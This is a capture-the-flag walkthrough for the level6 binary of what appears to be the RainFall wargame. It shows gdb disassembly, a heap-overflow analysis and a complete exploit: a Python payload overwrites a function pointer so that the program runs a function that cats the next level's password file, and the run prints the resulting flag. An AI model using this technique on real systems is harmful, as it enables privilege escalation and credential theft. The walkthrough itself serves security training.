# Walkthrough

Firstly, we discovered a binary file named level6 in the home directory. Upon running it, we observed that it either requires an argument or produces a segmentation fault.

```sh
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 AAAA
Nope
```

 To investigate further, we used gdb to reverse engineer the binary and identify its functions. Two functions were found:

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

 n(), which executes a system command using the string "/bin/cat /home/user/level7/.pass" as a parameter,

```s
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>: push   ebp
   0x08048455 <+1>: mov    ebp,esp
   0x08048457 <+3>: sub    esp,0x18
   0x0804845a <+6>: mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>: call   0x8048370 <system@plt>
   0x08048466 <+18>: leave  
   0x08048467 <+19>: ret 
```

  and m(), which uses the string "Nope" as an argument for the puts function.

```s
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>: push   ebp
   0x08048469 <+1>: mov    ebp,esp
   0x0804846b <+3>: sub    esp,0x18
   0x0804846e <+6>: mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>: call   0x8048360 <puts@plt>
   0x0804847a <+18>: leave  
   0x0804847b <+19>: ret  
```
  
   We then disassembled the main function and noticed that it allocated memory twice. The second allocation was assigned the address of the m() function `(0x8048468)`, while the first allocation used the strcpy function to copy the argument (av[1]) passed to the main function to its memory address. Eventually, the program invokes the address of the second memory allocation, which corresponds to the m() function.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>: push   ebp
   0x0804847d <+1>: mov    ebp,esp
   0x0804847f <+3>: and    esp,0xfffffff0
   0x08048482 <+6>: sub    esp,0x20
   0x08048485 <+9>: mov    DWORD PTR [esp],0x40
   0x0804848c <+16>: call   0x8048350 <malloc@plt>
   0x08048491 <+21>: mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>: mov    DWORD PTR [esp],0x4
   0x0804849c <+32>: call   0x8048350 <malloc@plt>
   0x080484a1 <+37>: mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>: mov    edx,0x8048468
   0x080484aa <+46>: mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>: mov    DWORD PTR [eax],edx
   0x080484b0 <+52>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>: add    eax,0x4
   0x080484b6 <+58>: mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>: mov    edx,eax
   0x080484ba <+62>: mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>: mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>: mov    DWORD PTR [esp],eax
   0x080484c5 <+73>: call   0x8048340 <strcpy@plt>
   0x080484ca <+78>: mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>: mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>: call   eax
   0x080484d2 <+86>: leave  
   0x080484d3 <+87>: ret    
```

Upon reflection, it becomes apparent that we need to modify the value of the second memory allocation to point to the n() function, which will allow us to retrieve the password from the .pass file of level 7. This can be achieved through buffer overflow, using the strcpy function to overwrite the value of the second memory allocation. To begin, we will inspect the heap to examine the memory allocations.

```c
(gdb) r AAAABBBBCCCCDDDD
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDD

Breakpoint 2, 0x080484ca in main ()
(gdb) info proc mapping
process 3592
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level6/level6
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level6/level6
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/48wx 0x804a000
0x804a000:	0x00000000	0x00000049	0x41414141	0x42424242  // 0x804a008 is the address of the second allocation
0x804a010:	0x43434343	0x44444444	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9  // 0x804a050 is the address of the second allocation
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000

```


Next, we must calculate the offset between the addresses of the first and second memory allocations, and then update the value of the memory address represented by `0x804a050` to `0x08048454`.

To achieve this, we will utilize Python to create a string that we will use to overwrite the value stored in the second memory allocation.

```sh
level6@RainFall:~$ python2 -c "print(0x804a050 - 0x804a008)"
72
level6@RainFall:~$ python -c 'print("A" * 72 + "\x08\x04\x84\x54"[::-1])' > /tmp/flag
level6@RainFall:~$ ./level6 `cat /tmp/flag`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
